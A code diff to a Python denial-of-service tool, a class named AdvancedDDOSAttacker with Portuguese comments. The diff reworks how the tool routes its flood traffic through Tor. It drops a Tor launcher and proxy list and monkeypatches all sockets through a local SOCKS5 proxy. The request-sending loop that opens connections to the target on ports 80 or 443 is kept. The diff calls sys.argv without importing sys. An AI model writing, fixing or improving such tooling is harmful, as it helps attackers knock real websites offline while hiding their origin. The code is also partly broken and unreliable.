@@ -1,4 +1,7 @@
 import socket
+import socks
+socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+socket.socket = socks.socksocket
 import threading
 import random
 import time
@@ -6,9 +9,9 @@ import logging
 import argparse
 import requests
 import dns.resolver
-import socks
-import stem.process
-from stem.util import term
+from urllib.parse import urlparse
+import http.client
+import ssl
 
 # Configuração de log
 logging.basicConfig(
@@ -45,30 +48,13 @@ class AdvancedDDOSAttacker:
             logging.error(f"Erro ao resolver IP: {str(e)}")
             raise
     
-    def start_tor(self):
-        """Inicia o Tor para bypass"""
-        try:
-            self.tor_process = stem.process.launch_tor_with_config(
-                config={
-                    'SocksPort': '9050',
-                    'ControlPort': '9051',
-                    'DataDirectory': '/tmp/tor_data'
-                },
-                take_ownership=True
-            )
+    def setup_socket(self):
+        """Configura socket com proxy"""
+        if '--tor' in sys.argv:
+            import socks
+            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+            socket.socket = socks.socksocket
             self.is_tor = True
-            logging.info("Tor iniciado com sucesso")
-        except Exception as e:
-            logging.error(f"Erro ao iniciar Tor: {str(e)}")
-    
-    def get_random_proxy(self):
-        """Retorna proxy aleatório"""
-        proxies = [
-            {"http": "socks5://127.0.0.1:9050"},  # Tor
-            {"http": "http://proxy.example.com:8080"},  # Proxy externo
-            {"http": "http://127.0.0.1:8080"}  # Local proxy
-        ]
-        return random.choice(proxies)
     
     def get_random_headers(self):
         """Retorna headers aleatórios"""
@@ -98,15 +84,11 @@ class AdvancedDDOSAttacker:
         """Envia requisições de ataque"""
         try:
             # Configurar proxy
-            proxy = self.get_random_proxy()
+            self.setup_socket()
             
-            # Conectar com socket ou proxy
-            if self.is_tor:
-                s = socks.socksocket()
-                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-            else:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            
+            # Conectar
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)
             s.connect((self.target_ip, 443 if 'https' in self.url else 80))
             
             for i in range(self.requests_per_thread):
@@ -147,10 +129,6 @@ class AdvancedDDOSAttacker:
         # Resolver IP
         if not self.target_ip:
             self.resolve_domain()
-        
-        # Iniciar Tor se necessário
-        if '--tor' in sys.argv:
-            self.start_tor()
         
         # Iniciar threads
         threads = []
